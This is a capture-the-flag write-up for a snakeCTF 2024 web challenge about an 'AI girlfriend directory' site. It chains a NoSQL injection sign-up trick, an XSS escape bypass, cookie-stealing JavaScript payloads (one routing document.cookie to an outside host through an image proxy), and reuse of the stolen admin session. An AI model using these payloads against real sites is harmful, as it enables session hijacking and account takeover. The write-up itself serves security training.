# SlashGirlfriends [_snakeCTF 2024 Quals_]

**Category**: web

## Description

I found this quirky site called SlashGirlfriends, which claims to be
the largest AI girlfriend directory. (Clever name, huh?) \
Word on the street is that the admins are hiding something juicy on the
site. But to get to the good stuff, you'll need the admin's credentials...

Think you can uncover their secret?

## Solution

### Step 1: Exploiting NoSQL Injection

The challenge begins by exploiting a NoSQL injection vulnerability when determining eligibility for a free premium membership. By signing up with a username such as `' || '1'=='1`, the backend query responsible for checking eligibility is manipulated to always return `true`. This is a crucial step as it grants premium access, allowing message history to be saved, which is necessary for the subsequent stages of the exploit.

### Step 2: Injecting XSS Payload and Triggering the Admin Bot

Once premium access has been obtained, an XSS vulnerability within the chat messages is exploited. The chat messages are stored as functions that return a string for HTML formatting. Although the server attempts to escape apostrophes in user messages to prevent XSS, this protection can be bypassed using `\\\"`.

There are 2 ways to approach the payload, since the admin bot cannot make external requests outside the website:

- The first approach, would be to use the Next.js image optimization API, which is misconfigured, and allows to fetch any link.
  An XSS payload similar to the following can be injected:

  ```javascript
  \\\"; fetch('/_next/image?url=example.com?cookie=' + document.cookie + '&w=640&q=75') //
  ```

- The second approach would be to just send the cookie in chat.
  An XSS payload similar to the following can be injected:

  ```javascript
   \\\"; fetch('/api/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ girlfriendId: 'cucalampa', message: document.cookie }) });  //
  ```

After injecting this payload into a chat message, it is necessary to report the conversation to the administrator bot. When the admin bot reviews the message, the XSS payload is executed.

### Step 3: Locating the Admin Page

Once the administrator's cookie has been obtained, admin-level access is achieved. The next task involves locating the admin page where the flag is stored. By examining the client-side code of the web application, particularly the `_buildManifest.js` file, the paths to all client pages are revealed, including the `/admin-page-very-important`.

### Step 4: Retrieving the Flag

Using the stolen administrator cookie, a request to the `/admin-page-very-important` page can be made. The flag will be displayed within a `<code>` element.

[Here](./attachments/solve.py) is the solver code.
